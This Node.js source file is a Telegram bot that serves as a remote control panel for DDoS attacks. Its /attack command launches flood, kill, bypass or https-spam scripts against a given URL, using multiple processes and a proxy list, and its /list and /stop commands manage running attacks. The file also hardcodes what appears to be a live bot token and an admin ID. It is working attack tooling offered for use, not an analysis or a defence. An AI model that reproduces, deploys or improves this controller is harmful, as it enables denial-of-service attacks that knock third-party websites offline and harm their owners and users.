const TelegramBot = require('node-telegram-bot-api')
const si = require('systeminformation')
const { spawn } = require('child_process')
const express = require('express')
const app = express()
const port = process.env.PORT || 3000

const token = '7937745403:AAFWtjpfNpZ7KUUAzj1Bw7g3arSB8T-EUE0'
const adminId = '6601930239'
const bot = new TelegramBot(token, { polling: true })

let attacks = []

app.get('/', (req, res) => {
  res.json({ telegramAdmin: '@xkprj' })
})

app.listen(port, () => {
  console.log(`Server running on port ${port}`)
})

bot.on('message', async (msg) => {
  try {
    if (msg.text === '/system') {
      if (msg.from.id.toString() !== adminId) {
        await bot.sendMessage(msg.chat.id, 'Access denied')
        return
      }
      const [cpu, mem, os, time, net, load] = await Promise.all([
        si.cpu(),
        si.mem(),
        si.osInfo(),
        si.time(),
        si.networkStats(),
        si.currentLoad()
      ])
      const data = {
        cpu: `${cpu.manufacturer} ${cpu.brand} @ ${cpu.speed}GHz`,
        memory: `${(mem.total / 1e9).toFixed(2)}GB total, ${(mem.free / 1e9).toFixed(2)}GB free`,
        os: `${os.platform} ${os.distro} ${os.release}`,
        uptime: `${Math.floor(time.uptime / 3600)}h ${Math.floor((time.uptime % 3600) / 60)}m`,
        network: net[0] ? `${(net[0].rx_sec / 125000).toFixed(2)}Mbps RX, ${(net[0].tx_sec / 125000).toFixed(2)}Mbps TX` : 'N/A',
        load: `${load.currentLoad.toFixed(2)}%`
      }
      await bot.sendMessage(msg.chat.id, Object.entries(data).map(([k, v]) => `${k}: ${v}`).join('\n'), { parse_mode: 'Markdown' })
    }

    if (msg.text.startsWith('/attack')) {
      if (msg.from.id.toString() !== adminId) {
        await bot.sendMessage(msg.chat.id, 'Access denied')
        return
      }
      const args = msg.text.split(' ').slice(1)
      let method = 'flood'
      let target = ''
      let time = 0
      let cores = 1
      if (args.includes('--core')) {
        const coreIndex = args.indexOf('--core')
        cores = parseInt(args[coreIndex + 1]) || 1
        args.splice(coreIndex, 2)
      }
      if (['flood', 'kill', 'bypass', 'https-spam'].includes(args[0])) {
        method = args[0]
        target = args[1]
        time = parseInt(args[2])
      } else {
        target = args[0]
        time = parseInt(args[1])
      }
      if (!target || isNaN(time) || time <= 0 || !['http://', 'https://'].some(p => target.startsWith(p))) {
        await bot.sendMessage(msg.chat.id, 'Usage: /attack [method] <target> <time> [--core <number>]')
        return
      }
      const rate = 64
      const threads = 8
      const proxyfile = './prx.txt'
      const attackId = Date.now()
      await bot.sendMessage(msg.chat.id, `Attack started\nID: ${attackId}\nTarget: ${target}\nTime: ${time}s\nMethod: ${method}\nCores: ${cores}`, { parse_mode: 'Markdown' })
      for (let i = 0; i < cores; i++) {
        try {
          const child = spawn('node', [`${method}.js`, target, time, rate, threads, proxyfile], {
            stdio: 'inherit',
            detached: false
          })
          attacks.push({
            id: attackId + i,
            target,
            time,
            rate,
            threads,
            proxyfile,
            status: 'running',
            pid: child.pid,
            process: child
          })
          child.on('error', (err) => {
            console.error(`Spawn error: ${err.message}`)
            attacks = attacks.filter(a => a.id !== (attackId + i))
            bot.sendMessage(msg.chat.id, `Attack ${attackId + i} failed: ${err.message}`)
          })
          child.on('close', (code) => {
            attacks = attacks.filter(a => a.id !== (attackId + i))
            bot.sendMessage(msg.chat.id, `Attack ${attackId + i} finished with code ${code}`)
          })
        } catch (err) {
          await bot.sendMessage(msg.chat.id, `Failed to start attack ${attackId + i}: ${err.message}`)
        }
      }
    }

    if (msg.text === '/list') {
      if (msg.from.id.toString() !== adminId) {
        await bot.sendMessage(msg.chat.id, 'Access denied')
        return
      }
      if (attacks.length === 0) {
        await bot.sendMessage(msg.chat.id, 'No active attacks')
        return
      }
      const attackList = attacks.map(a => `ID: ${a.id}, Target: ${a.target}, Time: ${a.time}s, Status: ${a.status}`).join('\n')
      await bot.sendMessage(msg.chat.id, `Active attacks:\n${attackList}`, { parse_mode: 'Markdown' })
    }

    if (msg.text.startsWith('/stop')) {
      if (msg.from.id.toString() !== adminId) {
        await bot.sendMessage(msg.chat.id, 'Access denied')
        return
      }
      const attackId = parseInt(msg.text.split(' ')[1])
      if (isNaN(attackId)) {
        await bot.sendMessage(msg.chat.id, 'Usage: /stop <attackId>')
        return
      }
      const attack = attacks.find(a => a.id === attackId)
      if (!attack) {
        await bot.sendMessage(msg.chat.id, 'Attack not found')
        return
      }
      try {
        attack.process.kill('SIGTERM')
        attacks = attacks.filter(a => a.id !== attackId)
        await bot.sendMessage(msg.chat.id, `Attack ${attackId} stopped`)
      } catch (err) {
        await bot.sendMessage(msg.chat.id, `Error stopping attack: ${err.message}`)
      }
    }
  } catch (err) {
    console.error(`Message handler error: ${err.message}`)
    await bot.sendMessage(msg.chat.id, 'An error occurred')
  }
})

bot.on('polling_error', (err) => {
  console.error(`Polling error: ${err.message}`)
})

process.on('unhandledRejection', (err) => {
  console.error(`Unhandled rejection: ${err.message}`)
})
